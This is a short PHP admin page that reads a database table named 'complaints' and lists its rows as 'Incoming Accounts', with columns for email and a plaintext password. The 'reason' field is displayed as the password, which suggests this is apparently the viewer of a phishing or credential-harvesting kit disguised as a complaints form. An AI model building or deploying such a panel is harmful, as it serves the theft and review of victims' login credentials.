<?php
require 'db.php';

$sql = "SELECT * FROM complaints ORDER BY created_at DESC";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Submissions</title>
    <link rel="stylesheet" href="style.css"> 
</head>
<body>
    
    <div class="card-container admin-card">
        
        <h1>Incoming Accounts</h1>
        
        <table>
            <tr>
                <th>Account ID</th>
                <th>Date</th>
                <th>Email</th>
                <th>Password</th>
            </tr>
            
            <?php
            if ($result->num_rows > 0) {
                while($row = $result->fetch_assoc()) {
                    $date = date("M j, Y g:i A", strtotime($row["created_at"]));
                    
                    echo "<tr>";
                    echo "<td>#" . $row["id"] . "</td>";
                    echo "<td>" . $date . "</td>";
                    echo "<td><strong>" . htmlspecialchars($row["username"]) . "</strong></td>";
                    echo "<td>" . htmlspecialchars($row["reason"]) . "</td>";
                    echo "</tr>";
                }
            } else {
                echo "<tr><td colspan='4' style='text-align: center; padding: 40px; color: #5f6368;'>No complaints found.</td></tr>";
            }
            $conn->close();
            ?>
            
        </table>
    </div>

</body>
</html>